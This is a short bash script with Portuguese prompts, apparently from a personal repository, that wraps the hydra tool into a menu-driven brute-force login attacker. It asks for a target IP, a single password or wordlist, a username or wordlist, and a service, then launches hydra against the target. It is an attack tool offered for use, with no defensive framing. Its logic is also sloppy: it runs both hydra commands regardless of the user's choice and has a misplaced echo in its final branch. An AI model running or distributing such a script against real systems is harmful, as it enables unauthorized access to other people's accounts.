#!/bin/bash

#Script Created By Henry
clear
apt install toilet
clear
if toilet Brute x_x; then echo "Created By Henry"; fi
echo "                                                 "
echo "     1:Começa ataque                             "
echo "     2:Sair                                      "
echo "                                                 "
echo "                                                 "
read -p "Opção : " opt
if [ $opt = "2" ];
then exit;
elif [ $opt = "1" ];
 then echo "                     "; fi
read -p "O ip do alvo : " alvo
read -p "Voce quer passar uma senha ou wordlist w/s : " senha
if [ $senha = "w" ];
then read -p "passe sua wordlist :" word;
elif [ $senha = "s" ];
then read -p "passe sua senha : " pass; fi
read -p "Voce quer passar um usuario ou wordlist w/u : " user
if [ $user = "w" ];
then read -p "passe sua wordlist : " wors;
elif [ $user = "u" ];
then read -p "passe seu usuario : " use; fi
read -p "serviço : " serve
echo "espere.."
echo "                                              "
echo "                                              "
hydra -l $use -p $pass $alvo $serve -v
hydra -L $wors -P $word $alvo $serve -v
echo "                                               "
read -p "Deseja Voltar ao Menu anterior y/n : " sec
if [ $sec = "y" ];
then bash bruteforce.sh;
elif [ $sec = "n" ];
echo "                                                "
then echo "Veja mais repositorios meus no git hub!"; fi
